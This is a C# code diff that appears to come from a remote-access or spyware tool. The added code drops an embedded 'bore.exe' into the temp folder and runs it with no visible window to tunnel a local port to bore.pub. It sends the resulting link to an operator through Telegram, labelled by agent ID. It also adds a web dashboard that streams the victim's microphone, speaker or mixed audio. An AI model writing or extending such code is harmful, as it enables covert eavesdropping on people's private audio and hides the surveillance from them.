-            catch { }
-            
-            Dispose();
+            string borePath = Path.Combine(Path.GetTempPath(), "bore_svc.exe");
+            try {
+                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+                string resourceName = assembly.GetManifestResourceNames().FirstOrDefault(n => n.EndsWith("bore.exe"));
+                if (resourceName != null) {
+                    using (Stream s = assembly.GetManifestResourceStream(resourceName))
+                    using (FileStream fs = new FileStream(borePath, FileMode.Create)) { s.CopyTo(fs); }
+                }
+            } catch { }
+
+            if (!File.Exists(borePath)) return;
+
+            ProcessStartInfo psi = new ProcessStartInfo {
+                FileName = borePath, Arguments = $"local {_port} --to bore.pub",
+                UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true, CreateNoWindow = true
+            };
+
+            try {
+                _boreProcess = new Process { StartInfo = psi };
+                DateTime lastPrint = DateTime.MinValue;
+
+                _boreProcess.OutputDataReceived += (s, e) => {
+                    if (string.IsNullOrEmpty(e.Data)) return;
+                    var match = System.Text.RegularExpressions.Regex.Match(e.Data, @"(?:remote_port|bore\.pub)[:\s]+(\d+)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
+                    if (match.Success) {
+                        string port = match.Groups[1].Value;
+                        if (port == "0" || port == _lastPort) return;
+                        if ((DateTime.Now - lastPrint).TotalSeconds < 2 && _lastPort != "") return;
+
+                        _lastPort = port;
+                        lastPrint = DateTime.Now;
+                        string link = $"http://bore.pub:{port}";
+                        
+                        string nick = NickFeature.GetNickname();
+                        string display = string.IsNullOrEmpty(nick) ? Config.UserId : $"{Config.UserId} ({nick})";
+                        TelegramInstance.SendMessage($"🎙️ <b>Mic Stream Ready!</b>\nAgent: <code>{display}</code>\n🔗 <a href=\"{link}\"><b>Open Dashboard</b></a>");
+                    }
+                };
+                _boreProcess.Start(); 
+                _boreProcess.BeginOutputReadLine();
+            } catch { }
         }
 
-        public void Dispose()
+        private string GetIndexHtml()
         {
-            if (_headers == null) return;
-            foreach (var pHdr in _headers)
-            {
-                try
-                {
-                    WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(pHdr, typeof(WAVEHDR));
-                    waveInUnprepareHeader(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
-                    
-                    if (hdr.lpData != IntPtr.Zero) 
-                    {
-                        Marshal.FreeHGlobal(hdr.lpData);
-                        hdr.lpData = IntPtr.Zero;
-                    }
-                    Marshal.DestroyStructure(pHdr, typeof(WAVEHDR)); 
-                    Marshal.FreeHGlobal(pHdr);
+            return @"
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='UTF-8'>
+    <title>VoiceStreamer ULTIMATE</title>
+    <style>
+        body { margin: 0; background: #020617; color: #f8fafc; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: #0f172a; padding: 3rem; border-radius: 1.5rem; border: 1px solid #1e293b; text-align: center; width: 380px; }
+        .badge { display: inline-block; padding: 4px 12px; border-radius: 100px; font-size: 0.7rem; font-weight: 800; margin-bottom: 1rem; }
+        .badge-p2p { background: #10b981; color: #064e3b; }
+        .badge-relay { background: #f59e0b; color: #78350f; }
+        h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #3b82f6; }
+        button { width: 100%; background: #3b82f6; color: #fff; border: none; padding: 1rem; border-radius: 0.75rem; font-weight: 700; cursor: pointer; margin: 1.5rem 0; }
+        .status-box { background: #020617; padding: 1rem; border-radius: 1rem; font-family: monospace; font-size: 0.8rem; }
+        .source-switch { display: flex; gap: 0.5rem; justify-content: center; margin-top: 1rem; }
+        .source-btn { background: #1e293b; color: #94a3b8; border: 1px solid #334155; padding: 0.5rem 1rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.75rem; }
+        .source-btn.active { background: #3b82f6; color: #fff; border-color: #3b82f6; }
+        .bitrate-btn { background: #422006; color: #fbbf24; border: 1px solid #78350f; padding: 0.4rem 0.8rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.7rem; font-weight: bold; }
+        .bitrate-btn.active { background: #f59e0b; color: #000; border-color: #fbbf24; }
+        .buffer-btn { background: #064e3b; color: #34d399; border: 1px solid #065f46; padding: 0.4rem 0.8rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.7rem; font-weight: bold; }
+        .buffer-btn.active { background: #10b981; color: #064e3b; border-color: #34d399; }
+        .reset-btn { background: #450a0a; color: #f87171; border: 1px solid #7f1d1d; padding: 0.5rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.75rem; margin-top: 1rem; width: 100%; font-weight: 800; }
+    </style>
+</head>
+<body>
+    <div class='card'>
+        <div id='modeBadge' class='badge badge-relay'>RELAY MODE</div>
+        <h1>VoiceStreamer Pro</h1>
+        <div style='font-size: 0.7rem; opacity: 0.5; margin-bottom: 1rem;'>Adaptive Bitrate Monitor</div>
+        
+        <div style='font-size: 0.7rem; color: #94a3b8; margin-bottom: 0.3rem;'>AUDIO SOURCE</div>
+        <div class='source-switch'>
+            <button class='source-btn active' onclick='setSource(0, this)'>MIC</button>
+            <button class='source-btn' onclick='setSource(1, this)'>SPEAKER</button>
+            <button class='source-btn' onclick='setSource(2, this)'>MIXED</button>
+        </div>
+
+        <div style='display: flex; gap: 0.5rem; margin-top: 1rem;'>
+            <div style='flex: 1;'>
+                <div style='font-size: 0.7rem; color: #94a3b8; margin-bottom: 0.3rem;'>QUALITY</div>
+                <div style='display: flex; gap: 0.2rem;'>
+                    <button class='bitrate-btn' onclick='setBitrate(320, this)'>320K</button>
+                    <button class='bitrate-btn' onclick='setBitrate(256, this)'>256K</button>
+                    <button class='bitrate-btn active' onclick='setBitrate(128, this)'>128K</button>
+                    <button class='bitrate-btn' onclick='setBitrate(64, this)'>64K</button>
+                </div>
+            </div>
+            <div style='flex: 1;'>
+                <div style='font-size: 0.7rem; color: #94a3b8; margin-bottom: 0.3rem;'>STABILITY BUFFER</div>
+                <div style='display: flex; gap: 0.2rem;'>
+                    <button class='buffer-btn' onclick='setBuffer(0.2, this)'>LOW</button>
+                    <button class='buffer-btn active' onclick='setBuffer(0.5, this)'>MED</button>
+                    <button class='buffer-btn' onclick='setBuffer(1.0, this)'>HIGH</button>
+                </div>
+            </div>
+        </div>
+
+        <button id='startBtn'>Start Monitoring</button>
+        
+        <div class='status-box'>
+            <div id='connState'>Status: Idle</div>
+            <div id='kbps' style='color:#10b981'>0.0 kbps</div>
+        </div>
+
+        <button class='reset-btn' onclick='resetAudio()'>RESET SYNC (FIX SLOW AUDIO)</button>
+    </div>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const modeBadge = document.getElementById('modeBadge');
+        const connState = document.getElementById('connState');
+        const kbpsEl = document.getElementById('kbps');
+        let audioCtx, ws, nextTime = 0, totalBytes = 0, lastReportTime = Date.now(), currentSR = 16000, targetBuffer = 0.5;
+        
+        const muLawTable = new Int16Array(256);
+        for (let i = 0; i < 256; i++) {
+            let mu = ~i, sign = (mu & 0x80), exponent = (mu & 0x70) >> 4, mantissa = (mu & 0x0F);
+            let sample = (mantissa << 3) + 132; sample <<= exponent; sample -= 132;
+            muLawTable[i] = sign ? -sample : sample;
+        }
+
+        const connectWS = () => {
+            console.log('Connecting to WebSocket...');
+            ws = new WebSocket((location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws');
+            ws.binaryType = 'arraybuffer';
+            
+            ws.onopen = () => {
+                console.log('WebSocket connected!');
+                connState.innerText = 'Status: Streaming via Relay';
+                startBtn.innerText = 'Stop';
+                startBtn.disabled = false;
+                startBtn.onclick = () => location.reload();
+            };
+
+            ws.onclose = () => {
+                console.warn('WebSocket closed. Retrying in 2s...');
+                connState.innerText = 'Status: Reconnecting...';
+                setTimeout(connectWS, 2000);
+            };
+
+            ws.onerror = (err) => {
+                console.error('WebSocket error:', err);
+                ws.close();
+            };
+
+            ws.onmessage = async (e) => {
+                totalBytes += e.data.byteLength;
+                const now = Date.now();
+                if (now - lastReportTime > 1000) {
+                    kbpsEl.innerText = ((totalBytes * 8) / 1000).toFixed(1) + ' kbps';
+                    totalBytes = 0; lastReportTime = now;
                 }
-                catch { }
+                const muData = new Uint8Array(e.data);
+                const floatData = new Float32Array(muData.length);
+                for (let i = 0; i < muData.length; i++) floatData[i] = muLawTable[muData[i]] / 32768.0;
+
+                const buffer = audioCtx.createBuffer(1, floatData.length, currentSR);
+                buffer.getChannelData(0).set(floatData);
+                const source = audioCtx.createBufferSource();
+                source.buffer = buffer;
+                const audioNow = audioCtx.currentTime;
+                const drift = nextTime - audioNow;
+
+                // Adaptive drift correction based on targetBuffer
+                if (drift > targetBuffer + 0.3) { resetAudio(); return; } 
+                if (drift > targetBuffer + 0.1) source.playbackRate.value = 1.15;
+                else if (drift > targetBuffer - 0.1) source.playbackRate.value = 1.05;
+
+                source.connect(audioCtx.destination);
+                if (nextTime < audioNow) nextTime = audioNow + targetBuffer; 
+                source.start(nextTime);
+                nextTime += (buffer.duration / source.playbackRate.value);
+            };
+        };
+
+        startBtn.onclick = async () => {
+            console.log('Starting monitoring...');
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            await audioCtx.resume();
+            startBtn.disabled = true;
+            startBtn.innerText = 'Connecting...';
+            connectWS();
+        };
+
+        const setSource = (id, btn) => {
+            fetch('/source?id=' + id);
+            document.querySelectorAll('.source-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+        };
+
+        const setBitrate = (val, btn) => {
+            currentSR = val * 1000 / 8;
+            fetch('/bitrate?val=' + val);
+            document.querySelectorAll('.bitrate-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            resetAudio();
+        };
+
+        const setBuffer = (val, btn) => {
+            targetBuffer = val;
+            document.querySelectorAll('.buffer-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            resetAudio();
+        };
+
+        const resetAudio = async () => {
+            console.log('Resetting audio sync...');
+            nextTime = 0;
+            if (audioCtx) {
+                try { await audioCtx.close(); } catch(e) {}
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             }
-            _headers.Clear();
-            _hWaveIn = IntPtr.Zero;
+        };
+    </script>
+</body>
+</html>";
         }
     }
 }
